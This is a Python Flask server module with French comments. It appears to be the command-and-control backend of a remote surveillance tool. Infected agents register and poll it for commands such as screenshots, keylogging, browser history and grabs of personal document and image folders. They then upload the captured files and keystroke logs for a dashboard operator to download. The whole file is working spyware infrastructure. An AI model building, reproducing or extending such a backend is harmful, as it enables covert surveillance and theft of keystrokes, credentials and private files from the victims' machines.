import os
import json
from flask import Blueprint, request, jsonify, send_from_directory
from werkzeug.utils import secure_filename
from database import get_db

machines_bp = Blueprint('machines', __name__)

ALLOWED_COMMANDS = {
    'screenshot', 'start_keylog', 'stop_keylog',
    'browser_history', 'apps',
    'files:Documents', 'files:Images', 'files:Videos', 'files:Bureau',
}


def get_upload_dir(machine_id):
    path = os.path.join('uploads', str(machine_id))
    os.makedirs(path, exist_ok=True)
    return path


# --- Routes utilisées par l'agent ET le frontend ---

@machines_bp.route('/report', methods=['POST'])
def report():
    """L'agent envoie ses infos au démarrage → on l'enregistre et on retourne son ID."""
    data = request.get_json()
    if not data or not data.get('hostname') or not data.get('os_info'):
        return jsonify({'error': 'hostname et os_info requis'}), 400

    db = get_db()
    cur = db.execute(
        'INSERT INTO machines (hostname, os_info, private_ip, public_ip) VALUES (?, ?, ?, ?)',
        (data['hostname'], data['os_info'], data.get('private_ip'), data.get('public_ip'))
    )
    db.commit()
    return jsonify({'id': cur.lastrowid}), 201


@machines_bp.route('', methods=['GET'])
def get_machines():
    """Retourne la liste de toutes les machines (utilisé par le dashboard)."""
    db = get_db()
    rows = db.execute('SELECT * FROM machines ORDER BY last_seen DESC').fetchall()
    return jsonify([dict(r) for r in rows])


@machines_bp.route('/<int:machine_id>', methods=['GET'])
def get_machine(machine_id):
    """Retourne les détails d'une machine (utilisé par la page MachineDetail)."""
    db = get_db()
    row = db.execute('SELECT * FROM machines WHERE id = ?', (machine_id,)).fetchone()
    if not row:
        return jsonify({'error': 'Machine introuvable'}), 404
    return jsonify(dict(row))


@machines_bp.route('/<int:machine_id>/command', methods=['GET', 'POST'])
def command(machine_id):
    db = get_db()
    if request.method == 'POST':
        # Frontend envoie une commande
        data = request.get_json()
        cmd = data.get('command') if data else None
        if not cmd or cmd not in ALLOWED_COMMANDS:
            return jsonify({'error': 'commande invalide'}), 400
        db.execute(
            'UPDATE machines SET pending_command = ?, command_result = NULL WHERE id = ?',
            (cmd, machine_id)
        )
        db.commit()
        return jsonify({'ok': True})
    else:
        # Agent poll → lit la commande en attente
        row = db.execute(
            'SELECT pending_command FROM machines WHERE id = ?', (machine_id,)
        ).fetchone()
        return jsonify({'command': row['pending_command'] if row else None})


@machines_bp.route('/<int:machine_id>/result', methods=['GET', 'POST'])
def result(machine_id):
    db = get_db()
    if request.method == 'POST':
        # Agent envoie le résultat
        data = request.get_json()
        val = data.get('result', '') if data else ''
        # Flask parse automatiquement le JSON imbriqué en dict → on re-sérialise en string
        result_str = json.dumps(val) if isinstance(val, (dict, list)) else str(val)
        db.execute(
            'UPDATE machines SET command_result = ?, pending_command = NULL WHERE id = ?',
            (result_str, machine_id)
        )
        db.commit()
        return jsonify({'ok': True})
    else:
        # Frontend récupère le résultat
        row = db.execute(
            'SELECT command_result FROM machines WHERE id = ?', (machine_id,)
        ).fetchone()
        return jsonify({'result': row['command_result'] if row else None})


@machines_bp.route('/<int:machine_id>/upload', methods=['POST'])
def upload(machine_id):
    """Agent upload un fichier binaire (screenshot, zip)."""
    if 'file' not in request.files:
        return jsonify({'error': 'pas de fichier'}), 400
    f = request.files['file']
    filename = secure_filename(f.filename)
    f.save(os.path.join(get_upload_dir(machine_id), filename))

    db = get_db()
    db.execute(
        'UPDATE machines SET command_result = ?, pending_command = NULL WHERE id = ?',
        (json.dumps({'type': 'file', 'filename': filename}), machine_id)
    )
    db.commit()
    return jsonify({'ok': True, 'filename': filename})


@machines_bp.route('/<int:machine_id>/keylog', methods=['POST'])
def keylog(machine_id):
    """Agent envoie un chunk de keylog (texte brut) → écrase keylog.txt."""
    data = request.data.decode('utf-8', errors='replace')
    with open(os.path.join(get_upload_dir(machine_id), 'keylog.txt'), 'w', encoding='utf-8') as f:
        f.write(data)
    return jsonify({'ok': True})


@machines_bp.route('/<int:machine_id>/download/<path:filename>', methods=['GET'])
def download(machine_id, filename):
    """Frontend télécharge un fichier uploadé par l'agent."""
    return send_from_directory(
        os.path.abspath(get_upload_dir(machine_id)), filename, as_attachment=True
    )
